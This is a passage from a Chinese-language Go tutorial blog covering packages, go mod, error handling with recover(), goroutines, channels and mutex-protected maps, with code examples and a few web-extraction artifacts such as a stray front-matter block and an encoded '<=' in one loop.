语言中一般使用文件所在的<strong>文件名来命令自己的包名</strong>，这样层次清晰便于管理。其中包名定义的注意事项如下：</p><ul><li>包名一般都是<strong>全小写</strong></li><li>包名不可以是路径</li><li>一个文件夹下只能有一个包名</li><li>每个程序的<strong>入口包名均为 main</strong> ，只有有main包，程序才可以执行</li></ul><h2 id="2-多行导入"><a href="#2-多行导入" class="headerlink" title="2. 多行导入"></a>2. 多行导入</h2><p>多行导入的方式有点类似于多个常量同时定义。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>    firstgo/packagetest1<br>    firstgo/packagetest2<br>)<br></code></pre></td></tr></table></figure><h2 id="3-使用规则"><a href="#3-使用规则" class="headerlink" title="3. 使用规则"></a>3. 使用规则</h2><p>在 Go 语言中，并不是直接导入了你写的一个包，你就可以直接使用包中的任何代码。这里有一个类似于Java和.NET的私有和公有的概念，你只可以使用导入的包中的<strong>公有的函数、变量以及自定义类型</strong>。Go 语言中区分公有私有的方法很简单，就是<strong>查看函数名、变量名以及自定义类型名的首字母是否为大写，大写的即为公有，小写的为私有</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> packagetest1<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//定义私有变量name</span><br><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;Test1&quot;</span><br><br><span class="hljs-comment">//PrintName 打印变量name</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintName</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;packagetest1 Name:&quot;</span>, name)<br>&#125;<br><span class="hljs-keyword">package</span> packagetest2<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//定义私有变量name</span><br><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;Test2&quot;</span><br><br><span class="hljs-comment">//PrintName 打印变量name</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintName</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;packagetest2 Name:&quot;</span>, name)<br>&#125;<br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;firstgo/packagetest1&quot;</span><br>    <span class="hljs-string">&quot;firstgo/packagetest2&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    packagetest1.PrintName()<span class="hljs-comment">//调用这个包中的PrintName()函数</span><br>    packagetest2.PrintName()<span class="hljs-comment">//调用这个包中的PrintName()函数</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Go-语言-go-mod-包依赖管理工具"><a href="#Go-语言-go-mod-包依赖管理工具" class="headerlink" title="Go 语言 go mod 包依赖管理工具"></a>Go 语言 go mod 包依赖管理工具</h1><h2 id="1-指令介绍"><a href="#1-指令介绍" class="headerlink" title="1. 指令介绍"></a>1. 指令介绍</h2><p>控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go mod<br></code></pre></td></tr></table></figure><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137080.png" alt="image-20230826212609479"></p><p>指令解析如下表：</p><table><thead><tr><th align="left">指令</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">go mod download</td><td align="left">下载依赖包到本地(默认下载目录为 $GOPATH&#x2F;pkg&#x2F;mod)</td></tr><tr><td align="left">go mod edit</td><td align="left">编辑 go.mod 文件(不常用)</td></tr><tr><td align="left">go mod graph</td><td align="left">输出go mod的依赖图</td></tr><tr><td align="left">go mod init</td><td align="left">初始化一个mod项目，即在包中示创建一个go.mod文件</td></tr><tr><td align="left">go mod tidy</td><td align="left">自动补全新增(删除减少)的依赖包</td></tr><tr><td align="left">go mod verify</td><td align="left">校验依赖包</td></tr><tr><td align="left">go mod why</td><td align="left">解释为什么要依赖，即显示这个包在哪里被导入了(不常用)</td></tr></tbody></table><h2 id="2-go-mod-中使用-replace"><a href="#2-go-mod-中使用-replace" class="headerlink" title="2. go mod 中使用 replace"></a>2. go mod 中使用 replace</h2><p><strong>replace</strong> 是用于使用<strong>本地包来替换导入包的一个操作</strong>，毕竟并不是所有导入包都能够下载的到，也有一些是你自己开发，并未上传到网络中的代码，这时候如果要在 go mod 中导入就需要 <strong>replace</strong> 了。</p><p>使用代码如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade">module go_study<br><br>go <span class="hljs-number">1.20</span><br><br><span class="hljs-built_in">replace</span> (<br>    <span class="hljs-comment">//包导入名 =&gt; 本地包相对路径/绝对路径</span><br>    go_study/<span class="hljs-function"><span class="hljs-params">packagetest1</span> =&gt;</span> ./packagetest1<br>    go_study/<span class="hljs-function"><span class="hljs-params">packagetest2</span> =&gt;</span> ./packagetest2<br>)<br><br></code></pre></td></tr></table></figure><h2 id="3-在项目中使用"><a href="#3-在项目中使用" class="headerlink" title="3. 在项目中使用"></a>3. 在项目中使用</h2><p>在<strong>任意文件夹</strong>中创建Go文件，然后录入以下代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.GET(<span class="hljs-string">&quot;/ping&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello Codey!&quot;</span>,<br>&#125;)<br>&#125;)<br>r.Run() <span class="hljs-comment">// listen and serve on 0.0.0.0:8080</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>打开控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">go mod init<br>go mod tidy<br></code></pre></td></tr></table></figure><p>这样就会开始下载依赖包</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137139.png" alt="image-20230826213048786"></p><p>最后项目文件夹里面会多出go.mod 和 go.sum ，其中 go.sum 不用在意，其中的内容为导入包的路径、版本和它的hash ，是自动生成自动更新的。</p><p>查看 go.mod会发现文件如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go">module go_study<br><br><span class="hljs-keyword">go</span> <span class="hljs-number">1.20</span><br><br>require github.com/gin-gonic/gin v1<span class="hljs-number">.9</span><span class="hljs-number">.1</span><br><br>require (<br>github.com/bytedance/sonic v1<span class="hljs-number">.9</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/chenzhuoyu/base64x v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20221115062448</span>-fe3a3abad311 <span class="hljs-comment">// indirect</span><br>github.com/gabriel-vasile/mimetype v1<span class="hljs-number">.4</span><span class="hljs-number">.2</span> <span class="hljs-comment">// indirect</span><br>github.com/gin-contrib/sse v0<span class="hljs-number">.1</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>github.com/<span class="hljs-keyword">go</span>-playground/locales v0<span class="hljs-number">.14</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/<span class="hljs-keyword">go</span>-playground/universal-translator v0<span class="hljs-number">.18</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/<span class="hljs-keyword">go</span>-playground/validator/v10 v10<span class="hljs-number">.14</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>github.com/goccy/<span class="hljs-keyword">go</span>-json v0<span class="hljs-number">.10</span><span class="hljs-number">.2</span> <span class="hljs-comment">// indirect</span><br>github.com/json-iterator/<span class="hljs-keyword">go</span> v1<span class="hljs-number">.1</span><span class="hljs-number">.12</span> <span class="hljs-comment">// indirect</span><br>github.com/klauspost/cpuid/v2 v2<span class="hljs-number">.2</span><span class="hljs-number">.4</span> <span class="hljs-comment">// indirect</span><br>github.com/leodido/<span class="hljs-keyword">go</span>-urn v1<span class="hljs-number">.2</span><span class="hljs-number">.4</span> <span class="hljs-comment">// indirect</span><br>github.com/mattn/<span class="hljs-keyword">go</span>-isatty v0<span class="hljs-number">.0</span><span class="hljs-number">.19</span> <span class="hljs-comment">// indirect</span><br>github.com/modern-<span class="hljs-keyword">go</span>/concurrent v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20180306012644</span>-bacd9c7ef1dd <span class="hljs-comment">// indirect</span><br>github.com/modern-<span class="hljs-keyword">go</span>/reflect2 v1<span class="hljs-number">.0</span><span class="hljs-number">.2</span> <span class="hljs-comment">// indirect</span><br>github.com/pelletier/<span class="hljs-keyword">go</span>-toml/v2 v2<span class="hljs-number">.0</span><span class="hljs-number">.8</span> <span class="hljs-comment">// indirect</span><br>github.com/twitchyliquid64/golang-asm v0<span class="hljs-number">.15</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/ugorji/<span class="hljs-keyword">go</span>/codec v1<span class="hljs-number">.2</span><span class="hljs-number">.11</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/arch v0<span class="hljs-number">.3</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/crypto v0<span class="hljs-number">.9</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/net v0<span class="hljs-number">.10</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/sys v0<span class="hljs-number">.8</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/text v0<span class="hljs-number">.9</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>google.golang.org/protobuf v1<span class="hljs-number">.30</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>gopkg.in/yaml.v3 v3<span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>)<br></code></pre></td></tr></table></figure><p><strong>自动记录了引用的包路径和版本</strong>。如果要修改使用版本，<strong>直接修改版本号即可</strong>。](&lt;—<br>​—<br>tag: [“Blog&#x2F;waiting”, “Go”]<br>genre: “博客”<br>​—</p><hr><h1 id="Go-语言中的错误和异常处理-1"><a href="#Go-语言中的错误和异常处理-1" class="headerlink" title="Go 语言中的错误和异常处理"></a>Go 语言中的错误和异常处理</h1><h2 id="1-error-接口-1"><a href="#1-error-接口-1" class="headerlink" title="1.error 接口"></a>1.error 接口</h2><p>error 是<strong>系统自带</strong>的一个接口类型的自定义类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> <span class="hljs-type">error</span> <span class="hljs-keyword">interface</span> &#123;<br>    Error() <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-errors-包-1"><a href="#2-errors-包-1" class="headerlink" title="2.errors 包"></a>2.errors 包</h2><p>errors 包中包含了一个实现 error 这个接口的结构体类型 errorString。可以直接使用包中的方法来自定义一些错误，从而返回希望被上层代码处理的错误信息</p><p>试例代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;errors&quot;</span><br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    t, err := divide(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(t)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">divide</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, errors.New(<span class="hljs-string">&quot;除数不能为0&quot;</span>)<br>    &#125;<br>    <span class="hljs-keyword">return</span> a / b, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-异常处理-1"><a href="#3-异常处理-1" class="headerlink" title="3.异常处理"></a>3.异常处理</h2><p>如果调用的方法的开发者不够仔细，并没有将所有的异常都考虑到并作为错误返回，那么程序可能就会<strong>被其影响而崩溃</strong>，GO 语言提供了一个叫<code>recover()</code>的函数，用于处理这种问题。一般常用于服务启动的入口函数，因为网络等外部因素，极有可能会导致程序异常，这些异常就需要这个函数来捕获。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        err := <span class="hljs-built_in">recover</span>()<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;程序运行中出现异常：&quot;</span>, err)<br>        &#125;<br>    &#125;()<br>    t := divide(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>    fmt.Println(t)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">divide</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>    <span class="hljs-keyword">return</span> a / b<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Go-语言的并发-1"><a href="#Go-语言的并发-1" class="headerlink" title="Go 语言的并发"></a>Go 语言的并发</h1><p>Go 语言中的<strong>多线程操</strong>作是其语言的一大特色，它具有其它语言无法比拟的，可以近乎<strong>无限开启的线程</strong>。在 Go 语言中被称之为 <strong>goroutine</strong> ，它是线程的<strong>轻量级实现</strong>。</p><h2 id="1-Go-语言的-goroutine-1"><a href="#1-Go-语言的-goroutine-1" class="headerlink" title="1.Go 语言的 goroutine"></a>1.Go 语言的 goroutine</h2><p>在 Go 语言中使用 <strong>go</strong> 关键字来创建 goroutine ，形如<code>go 函数名()</code>的形式去创建。<strong>每一个 goroutine 必须是一个函数，这个函数也可以是匿名函数</strong>。</p><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//打印0到10的数字</span><br>    <span class="hljs-keyword">go</span> print0to10()<br>    <span class="hljs-comment">//打印A到Z的字符</span><br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">for</span> i := <span class="hljs-string">&#x27;A&#x27;</span>; i %<span class="hljs-number">3</span>C= <span class="hljs-string">&#x27;K&#x27;</span>; i++ &#123;<br>            fmt.Println(<span class="hljs-string">&quot;printAtoK:&quot;</span>, <span class="hljs-type">string</span>(i))<br>            time.Sleep(time.Microsecond)<br>        &#125;<br>    &#125;()<br>    time.Sleep(time.Second)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">print0to10</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10</span>; i++ &#123;<br>        fmt.Println(<span class="hljs-string">&quot;print0to10:&quot;</span>, i)<br>        time.Sleep(time.Microsecond)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行结果<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137030.png" alt="image.png"><br>从执行结果中可以看出打印数字和打印字符的两个 goroutine 是并发执行的。执行顺序是由 cpu 来调度的，所以执行结果可能每次都不一样。</p><h2 id="2-Go语言并发通讯-1"><a href="#2-Go语言并发通讯-1" class="headerlink" title="2.  Go语言并发通讯"></a>2.  Go语言并发通讯</h2><p>其它语言并发时进程中的通讯一般都是通过共享内存(全局变量)的方式来实现的，这样一来各个模块之间的耦合会变得非常紧密。所以后来提出了<strong>使用通讯来共享内存</strong>这一概念，来解耦合。在 Go 语言中就是使用 channel 的方式来达到这一目的的。</p><p>代码实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> c1 <span class="hljs-keyword">chan</span> <span class="hljs-type">rune</span> = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">rune</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">var</span> c2 <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//打印0到10的数字</span><br>    <span class="hljs-keyword">go</span> print0to10()<br>    <span class="hljs-comment">//打印A到Z的字符</span><br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        c2 &lt;- <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">11</span>; i++ &#123;<br>            char := &lt;-c1<br>            fmt.Println(<span class="hljs-string">&quot;printAtoK:&quot;</span>, <span class="hljs-type">string</span>(char))<br>            c2 &lt;- i<br>        &#125;<br>    &#125;()<br>    time.Sleep(time.Second)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">print0to10</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-string">&#x27;A&#x27;</span>; i &lt;= <span class="hljs-string">&#x27;K&#x27;</span>; i++ &#123;<br>        num := &lt;-c2<br>        fmt.Println(<span class="hljs-string">&quot;print0to10:&quot;</span>, num)<br>        c1 &lt;- i<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137055.png" alt="image.png"><br>和没用使用 channel 之前的代码不同，这次等同于使用 channel 实现了 goroutine 的调度，使其轮流执行。</p><h1 id="Go语言进程锁-1"><a href="#Go语言进程锁-1" class="headerlink" title="Go语言进程锁"></a>Go语言进程锁</h1><p>之所以线程不安全是因为其内部实现机制中无法同时读写，若有两个 goroutine <strong>一个在读取 map 中的值，而另一个在更新 map 中的值</strong>，就会导致程序崩溃。</p><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;B&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;C&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;D&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;E&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;F&quot;</span>: <span class="hljs-number">3</span>&#125;<br>    <span class="hljs-comment">//创建100个goroutine对map进行读写</span><br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">for</span> v := <span class="hljs-keyword">range</span> m &#123;<br>                m[v] = <span class="hljs-number">100</span><br>            &#125;<br>        &#125;()<br>    &#125;<br>    time.Sleep(time.Second)<br>    fmt.Println(m)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行上述代码有时会输出正确结果：</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137052.png" alt="image-20230822201432973"></p><p>但更多的时候会输出读写冲突，就是线程不安全的 map 不建议使用的原因，除了直接使用线程安全的 map 之外，还可以为这些 goruntine <strong>加上锁</strong>，使其无法同时对 map 进行读写操作，这样也可以保障各线程的安全。</p><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> lock sync.Mutex <span class="hljs-comment">//定义一个锁变量</span><br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;B&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;C&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;D&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;E&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;F&quot;</span>: <span class="hljs-number">3</span>&#125;<br><span class="hljs-comment">// 创建100个goroutine对map进行读写</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock() <span class="hljs-comment">// 在读取map前锁定这个锁，使其它线程访问这个锁要阻塞</span><br><span class="hljs-keyword">for</span> v := <span class="hljs-keyword">range</span> m &#123;<br>m[v] = <span class="hljs-number">100</span><br>&#125;<br>lock.Unlock() <span class="hljs-comment">//在读取map前释放这个锁</span><br>&#125;()<br>&#125;<br>time.Sleep(time.Second)<br>fmt.Println(m)<br>&#125;<br></code></pre></td></tr></table></figure><p>加了锁之后，无论多少次的执行结果都是正确的。</p><h1 id="Go语言的包-1"><a href="#Go语言的包-1" class="headerlink" title="Go语言的包"></a>Go语言的包</h1><p>和大部分语言一致，Go 语言也是支持调用其它文件中的 Go 代码的。<strong>Go 